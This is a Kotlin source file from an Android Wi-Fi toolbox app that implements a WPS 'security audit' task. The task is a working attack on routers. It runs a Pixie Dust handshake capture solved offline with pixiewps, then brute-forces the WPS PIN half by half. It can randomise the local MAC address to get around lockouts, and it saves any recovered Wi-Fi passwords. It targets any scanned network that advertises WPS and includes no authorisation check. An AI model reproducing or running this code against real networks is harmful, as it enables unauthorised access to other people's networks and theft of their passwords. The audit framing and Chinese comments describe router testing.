package io.github.bszapp.wifitoolbox.service.task

import android.net.wifi.ScanResult
import android.os.SystemClock
import io.github.bszapp.wifitoolbox.contract.task.*
import io.github.bszapp.wifitoolbox.contract.wifilist.supportsWps
import io.github.bszapp.wifitoolbox.service.AndroidApi
import io.github.bszapp.wifitoolbox.service.TerminalManager
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import kotlin.math.pow

/**
 * 弱 PIN、随机数缺陷漏洞与本次批量 PIN 尝试结果评估。
 *
 * 每个网络按 [WpsSecurityAuditPhase] 三阶段推进，全程复用同一条 [WpsFifoSession] 长会话、
 * 串行执行，进度在每次尝试后写回历史。PIN 生成方式见 [WpsSecurityAuditTaskInput]。
 *
 * 结果分类：任何阶段取得网络密码即视为路由器失守并结束该网络，不要求完整协议结束。
 * 未取得密码时，WPS_FAIL 按配置重试，收到 M5 的事实用于确认前半段，WSC_NACK 用于正常拒绝。
 * 不用 M 消息编号推断错误；其他异常按配置重试当前 PIN 并指数冷却，重试用尽后推进游标。
 */
internal class WpsSecurityAuditTask(
    input: WpsSecurityAuditTaskInput,
    private val terminals: TerminalManager,
    private val androidApi: AndroidApi,
    private val scanResults: () -> List<ScanResult>,
    private val onSavedWifiNetworksChanged: () -> Unit,
    private val onError: (String, Throwable) -> Unit,
) : ServiceTask {
    @Volatile private var config = input.config
    private val updates = LinkedBlockingQueue<TaskUpdatePayload>()
    private val entries = input.targets.map { Entry(it, config) }
    private val solver = WpsPixieSolver(terminals)
    private val stoppedNetworks = ConcurrentHashMap.newKeySet<String>()
    private var attemptingEntry: Entry? = null

    override fun update(update: TaskUpdateRequest): Boolean {
        (update.payload as? TaskUpdatePayload.SecurityAuditRemove)?.let { stoppedNetworks.add(it.ssid) }
        synchronized(updates) { updates.offer(update.payload) }
        return true
    }

    override fun run(context: TaskContext) {
        context.log("WPS 安全测试开始：${entries.size} 个网络排队，单会话串行执行")
        val session = WpsFifoSession(terminals, context) { progress ->
            attemptingEntry?.let { entry ->
                entry.record = entry.record.copy(handshakeProgress = progress, updatedAt = System.currentTimeMillis())
                publish(context)
            }
        }
        try {
            session.start()
            while (true) {
                try {
                    context.ensureRunning()
                    drainUpdates(context)
                    val active = entries.filter { it.record.active }
                    if (active.isEmpty()) {
                        context.log("运行队列为空，本批 WPS 安全测试结束")
                        return
                    }
                    val now = SystemClock.elapsedRealtime()
                    val next = active.filter { it.readyAt <= now }.minByOrNull { it.lastAttemptAt }
                    if (next == null) {
                        publish(context)
                        updates.poll((active.minOf { it.readyAt } - now).coerceIn(1, 100), TimeUnit.MILLISECONDS)
                            ?.let { applyUpdate(it, context) }
                        continue
                    }
                    attemptingEntry = next
                    try {
                        attempt(next, context, session)
                    } catch (_: NetworkStoppedException) {
                        stopEntry(next, context)
                        publish(context)
                    } finally {
                        attemptingEntry = null
                    }
                } catch (stop: InterruptedException) {
                    throw stop
                } catch (error: Exception) {
                    context.log("本轮异常，保留当前位置继续：${error.message ?: error.javaClass.name}")
                    Thread.sleep(100)
                }
            }
        } finally {
            runCatching { session.close() }
                .onFailure { context.log("关闭 WPS 会话失败：${it.message ?: it.javaClass.name}") }
            entries.filter { it.record.active }.forEach {
                it.record = it.record.copy(
                    state = SecurityAuditNetworkState.STOPPED,
                    nextAttemptAt = null, handshakeProgress = null,
                    updatedAt = System.currentTimeMillis(), message = "已停止",
                )
            }
            publish(context)
        }
    }

    private fun attempt(entry: Entry, context: TaskContext, session: WpsFifoSession) {
        checkNetworkRunning(entry, context)
        val selectedConfig = config
        selectedConfig.maxAttemptsPerNetwork.takeIf { it > 0 && entry.record.attempts >= it }?.let {
            finishByLimit(entry, context, it)
            return
        }
        val pin = entry.pendingPin ?: currentPin(entry)?.also { entry.pendingPin = it }
        if (pin == null) {
            if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) {
                entry.record = entry.record.copy(phase = WpsSecurityAuditPhase.FIRST_HALF,
                    state = SecurityAuditNetworkState.QUEUED, nextAttemptAt = null,
                    updatedAt = System.currentTimeMillis(), message = "排队中")
                context.log("[${entry.record.ssid}] 仙尘阶段结束，进入前四位枚举")
                publish(context)
            } else finishPhase(entry, context)
            return
        }
        val started = SystemClock.elapsedRealtime()
        entry.lastAttemptAt = started
        val localMac = selectMac(entry, selectedConfig)
        val targetMac = resolveMac(entry) ?: run {
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.ERROR, nextAttemptAt = null,
                updatedAt = System.currentTimeMillis(), message = "当前扫描结果没有同名且带 WPS 广播的接入点")
            publish(context)
            return
        }
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.CONNECTING, config = selectedConfig,
            mac = targetMac, attempts = entry.record.attempts + 1, nextAttemptAt = null,
            handshakeProgress = WpsHandshakeProgress(WpsHandshakeStage.PREPARING),
            updatedAt = System.currentTimeMillis(), message = describe(entry, pin, localMac))
        context.log("[${entry.record.ssid}] 尝试 PIN $pin（${phaseLabel(entry.record.phase)}）" +
            (localMac?.let { " mac=$it" } ?: ""))
        publish(context)
        val result = try {
            session.run(JSONObject().put("mode", "pin").put("mac", targetMac).put("pin", pin)
                .put("localMac", localMac ?: JSONObject.NULL).put("completeProtocol", true),
                changed = { entry.record.ssid in stoppedNetworks })
        } catch (stop: InterruptedException) {
            throw stop
        } catch (error: Exception) {
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.ERROR, nextAttemptAt = null, handshakeProgress = null,
                updatedAt = System.currentTimeMillis(), message = "WPS 会话异常：${error.message ?: error.javaClass.name}")
            publish(context)
            throw error
        }
        val duration = SystemClock.elapsedRealtime() - started
        entry.costs += duration
        if (entry.costs.size > 20) entry.costs.removeAt(0)
        entry.record = entry.record.copy(
            elapsedMillis = entry.record.elapsedMillis + duration, updatedAt = System.currentTimeMillis(),
            handshakeProgress = null,
            averageAttemptMillis = if (entry.costs.size >= 5) entry.costs.sum() / entry.costs.size else null,
        )
        context.log("[${entry.record.ssid}] 本轮结果=${result.status}")
        // success 表示完整协议结果；已取得密码的安全结论独立于协议是否正常结束。
        result.network?.let { network ->
            entry.pendingPin = null
            entry.readyAt = 0
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.SUCCEEDED,
                phase = WpsSecurityAuditPhase.DONE, password = network.password,
                pin = pin, passwordFoundPhase = entry.record.phase,
                nDayVerdict = if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST &&
                    entry.record.vulnPin == pin) true else entry.record.nDayVerdict,
                handshake = result.handshake ?: entry.record.handshake,
                retryCount = 0,
                nextAttemptAt = null, message = "已取得密码，路由器失守，建议立即更换")
            context.log("[${entry.record.ssid}] 已取得密码（PIN $pin），路由器失守")
            publish(context)
            context.recordCapturedNetwork(network)
            saveCapturedWpsNetwork(network, context, androidApi, onSavedWifiNetworksChanged, onError)
            return
        }
        checkNetworkRunning(entry, context)
        // 仙尘阶段先抓握手数据，再交给 pixiewps 离线计算随机数缺陷漏洞 PIN。
        if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) captureHandshake(entry, result, context)
        when {
            result.status == WPS_FAIL -> retryOrAdvance(entry, context, selectedConfig)
            // 收到 M5 即前半段正确，前四位确定后转入后三位枚举。
            result.firstHalfValid && entry.record.firstHalf == null -> {
                entry.readyAt = 0
                entry.pendingPin = null
                entry.record = entry.record.copy(firstHalf = pin.take(4),
                    phase = WpsSecurityAuditPhase.SECOND_HALF, secondHalfIndex = 0, retryCount = 0,
                    state = SecurityAuditNetworkState.QUEUED,
                    nextAttemptAt = null, message = "排队中")
                context.log("[${entry.record.ssid}] 前四位已确定：${pin.take(4)}")
            }
            // PIN 正常被拒：直接推进游标，不重试也不冷却。
            result.status == WSC_NACK -> advance(entry)
            // 超时、WPS-FAIL、未进入握手：按配置重试当前 PIN 并指数冷却。
            else -> retryOrAdvance(entry, context, selectedConfig)
        }
        publish(context)
    }

    /** 仙尘阶段：用第一次握手的完整数据离线计算漏洞 PIN，只算一次。 */
    private fun captureHandshake(entry: Entry, result: WpsFifoSession.Result, context: TaskContext) {
        if (entry.record.vulnPin != null) return
        val handshake = result.handshake ?: entry.record.handshake ?: return
        entry.record = entry.record.copy(handshake = handshake)
        if (entry.solverTried) return
        entry.solverTried = true
        entry.record = entry.record.copy(message = "正在进行 Pixie Dust 离线计算", handshakeProgress = null,
            updatedAt = System.currentTimeMillis())
        publish(context)
        val solved = solver.solve(handshake, context) { checkNetworkRunning(entry, context) }
        entry.record = entry.record.copy(vulnPin = solved, nDayVerdict = solved != null)
        context.log(
            if (solved != null) "[${entry.record.ssid}] pixiewps 解出漏洞 PIN：$solved"
            else "[${entry.record.ssid}] pixiewps 未能解出漏洞 PIN，继续枚举",
        )
    }

    private fun retryOrAdvance(entry: Entry, context: TaskContext, selectedConfig: WpsSecurityAuditConfig) {
        val count = entry.record.retryCount + 1
        if (count > retryBudget(selectedConfig)) {
            context.log("[${entry.record.ssid}] 异常重试已用尽，推进游标")
            advance(entry)
        } else {
            val delay = cooldownMillis(selectedConfig, count)
            entry.readyAt = entry.lastAttemptAt + delay
            entry.record = entry.record.copy(retryCount = count,
                state = if (delay > 0) SecurityAuditNetworkState.COOLDOWN else SecurityAuditNetworkState.QUEUED,
                message = "握手异常，第 $count 次重试",
                nextAttemptAt = System.currentTimeMillis() + (entry.readyAt - SystemClock.elapsedRealtime()).coerceAtLeast(0))
        }
    }

    private fun advance(entry: Entry) {
        entry.readyAt = 0
        entry.pendingPin = null
        if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) {
            if (!entry.fairyProbeTried) entry.fairyProbeTried = true else entry.fairyVulnTried = true
        }
        entry.record = when (entry.record.phase) {
            WpsSecurityAuditPhase.FIRST_HALF -> entry.record.copy(firstHalfIndex = entry.record.firstHalfIndex + 1)
            WpsSecurityAuditPhase.SECOND_HALF -> entry.record.copy(secondHalfIndex = entry.record.secondHalfIndex + 1)
            else -> entry.record
        }.copy(retryCount = 0, state = SecurityAuditNetworkState.QUEUED, nextAttemptAt = null, message = "排队中")
    }

    /** 当前阶段游标已经跑完，只记录本阶段未取得密码并结束该网络。 */
    private fun finishPhase(entry: Entry, context: TaskContext) {
        val phase = entry.record.phase
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.EXHAUSTED,
            phase = WpsSecurityAuditPhase.DONE, nextAttemptAt = null, handshakeProgress = null,
            updatedAt = System.currentTimeMillis(),
            message = when (phase) {
                WpsSecurityAuditPhase.FIRST_HALF -> "前四位全部尝试仍未确认前半段，未取得密码"
                WpsSecurityAuditPhase.SECOND_HALF -> "后三位全部尝试仍未取得密码"
                else -> "本阶段已完成"
            })
        context.log("[${entry.record.ssid}] ${entry.record.message}")
    }

    private fun finishByLimit(entry: Entry, context: TaskContext, limit: Int) {
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.EXHAUSTED,
            phase = WpsSecurityAuditPhase.DONE, nextAttemptAt = null,
            updatedAt = System.currentTimeMillis(), handshakeProgress = null,
            message = "已达到单网络尝试上限 $limit，未取得密码")
        context.log("[${entry.record.ssid}] 达到尝试上限 $limit，提前结束")
    }

    /** WPS 审计任务中 6 同样按 6 次重试处理，避免异常网络无限停滞。 */
    private fun retryBudget(selectedConfig: WpsSecurityAuditConfig): Int =
        selectedConfig.retryCount.coerceIn(0, 6)

    /** 纯读取；游标推进与重试判定由 [advance] / [retryOrAdvance] 负责。 */
    private fun currentPin(entry: Entry): String? = when (entry.record.phase) {
        WpsSecurityAuditPhase.FAIRY_DUST -> when {
            !entry.fairyProbeTried -> FAIRY_PIN
            entry.record.vulnPin != null && !entry.fairyVulnTried -> entry.record.vulnPin
            else -> null
        }
        WpsSecurityAuditPhase.FIRST_HALF ->
            firstHalfPin(entry.record.firstHalfIndex).takeIf { entry.record.firstHalfIndex < FIRST_HALF_COUNT }
        WpsSecurityAuditPhase.SECOND_HALF -> {
            val firstHalf = entry.record.firstHalf
            if (firstHalf == null || entry.record.secondHalfIndex >= SECOND_HALF_COUNT) null
            else secondHalfPin(firstHalf, entry.record.secondHalfIndex)
        }
        WpsSecurityAuditPhase.DONE -> null
    }

    private fun drainUpdates(context: TaskContext) {
        while (true) {
            val payload = updates.poll() ?: break
            applyUpdate(payload, context)
        }
        publish(context)
    }

    private fun applyUpdate(payload: TaskUpdatePayload, context: TaskContext) {
        when (payload) {
                is TaskUpdatePayload.WpsSecurityAuditConfigure -> {
                    config = payload.config
                    entries.filter { it.record.active }.forEach {
                        it.record = it.record.copy(config = config)
                        if (it.record.retryCount > 0) {
                            it.readyAt = it.lastAttemptAt + cooldownMillis(config, it.record.retryCount)
                            it.record = it.record.copy(nextAttemptAt = System.currentTimeMillis() +
                                (it.readyAt - SystemClock.elapsedRealtime()).coerceAtLeast(0))
                        }
                    }
                    context.log("WPS 安全测试配置已更新")
                }
                is TaskUpdatePayload.SecurityAuditRemove -> entries
                    .filter { it.record.active && it.record.ssid == payload.ssid }
                    .forEach { stopEntry(it, context) }
                else -> Unit
        }
        publish(context)
    }

    private fun checkNetworkRunning(entry: Entry, context: TaskContext) {
        context.ensureRunning()
        if (entry.record.ssid in stoppedNetworks) throw NetworkStoppedException()
    }

    private fun stopEntry(entry: Entry, context: TaskContext) {
        entry.readyAt = 0
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.STOPPED, nextAttemptAt = null,
            handshakeProgress = null, updatedAt = System.currentTimeMillis(), message = "用户停止此网络")
        context.log("[${entry.record.ssid}] 已移出运行队列")
    }

    private class NetworkStoppedException : RuntimeException()

    private fun publish(context: TaskContext) =
        context.publishAuditNetworks(config, entries.map { it.record })

    private fun describe(entry: Entry, pin: String, localMac: String?): String {
        val prefix = when (entry.record.phase) {
            WpsSecurityAuditPhase.FAIRY_DUST -> "仙尘阶段"
            WpsSecurityAuditPhase.FIRST_HALF -> "前四位 ${pin.take(4)}"
            WpsSecurityAuditPhase.SECOND_HALF -> "后三位 ${pin.substring(4, 7)}"
            WpsSecurityAuditPhase.DONE -> ""
        }
        return if (localMac != null) "正在尝试：$prefix\nMAC：$localMac" else "正在尝试：$prefix"
    }

    private fun phaseLabel(phase: WpsSecurityAuditPhase) = when (phase) {
        WpsSecurityAuditPhase.FAIRY_DUST -> "仙尘阶段"
        WpsSecurityAuditPhase.FIRST_HALF -> "前四位枚举"
        WpsSecurityAuditPhase.SECOND_HALF -> "后三位枚举"
        WpsSecurityAuditPhase.DONE -> "已结束"
    }

    /** 目标接入点：优先使用指定 MAC，否则取扫描结果中同名且带 WPS 广播的最强接入点。 */
    private fun resolveMac(entry: Entry): String? {
        entry.record.mac?.let { return it }
        return scanResults().filter { it.SSID == entry.record.ssid && it.supportsWps() }
            .maxByOrNull { if (it.level == 0) Int.MIN_VALUE else it.level }
            ?.BSSID?.lowercase()
    }

    /** WPS 走网卡通道，任何策略都会实际改写本机 MAC；null 表示沿用设备原 MAC。 */
    private fun selectMac(entry: Entry, selectedConfig: WpsSecurityAuditConfig): String? =
        when (selectedConfig.macMode) {
            SecurityAuditMacMode.DEVICE -> { entry.localMac = null; null }
            SecurityAuditMacMode.EVERY_ATTEMPT -> randomMacAddress().also { entry.localMac = it }
            SecurityAuditMacMode.ON_FAILURE ->
                if (entry.localMac == null || entry.record.retryCount >= selectedConfig.macChangeThreshold) {
                    randomMacAddress().also { entry.localMac = it }
                } else entry.localMac
        }

    private fun randomMacAddress(): String =
        (1..6).joinToString(":") { "%02x".format(SECURE_RANDOM.nextInt(256) and 0xfc or 0x02) }

    private fun cooldownMillis(selectedConfig: WpsSecurityAuditConfig, retries: Int): Long =
        if (retries > 0) 2.0.pow(retries.toDouble() - 1).toLong() * selectedConfig.cooldownBaseMillis else 0

    /** 第二阶段 PIN：四位前缀 + `000` + 七位校验位。 */
    private fun firstHalfPin(index: Int): String =
        "%04d000".format(index) + wpsChecksum(index * 1000)

    /** 第三阶段 PIN：四位前缀 + 三位后缀 + 七位校验位。 */
    private fun secondHalfPin(firstHalf: String, index: Int): String =
        "%s%03d".format(firstHalf, index) + wpsChecksum(firstHalf.toInt() * 1000 + index)

    /** 标准 WPS 七位 PIN 校验位算法。 */
    private fun wpsChecksum(seven: Int): Int {
        var accum = 0
        var value = seven
        while (value > 0) {
            accum += 3 * (value % 10)
            value /= 10
            accum += value % 10
            value /= 10
        }
        return (10 - accum % 10) % 10
    }

    private class Entry(target: WpsSecurityAuditTarget, config: WpsSecurityAuditConfig) {
        var record = AuditRecord.Wps(
            id = UUID.randomUUID().toString(), ssid = target.ssid, config = config,
            startedAt = System.currentTimeMillis(), updatedAt = System.currentTimeMillis(),
            state = SecurityAuditNetworkState.QUEUED, mac = target.mac,
            phase = target.resumePhase, vulnPin = target.resumeVulnPin,
            firstHalf = target.resumeFirstHalf, firstHalfIndex = target.resumeFirstHalfIndex,
            secondHalfIndex = target.resumeSecondHalfIndex,
        )
        var localMac: String? = null
        /** 重试时锁定的 PIN；推进游标后清空，由 [currentPin] 重新计算。 */
        var pendingPin: String? = null
        var lastAttemptAt = 0L
        var readyAt = 0L
        val costs = mutableListOf<Long>()
        var fairyProbeTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST ||
            target.resumeVulnPin != null
        var fairyVulnTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
        var solverTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST ||
            target.resumeVulnPin != null
    }

    private companion object {
        val SECURE_RANDOM = java.security.SecureRandom()
        const val WSC_NACK = "WSC_NACK"
        const val WPS_FAIL = "WPS_FAIL"
        const val FAIRY_PIN = "76970009"//TODO:12345670
        const val FIRST_HALF_COUNT = 10000
        const val SECOND_HALF_COUNT = 1000
    }
}
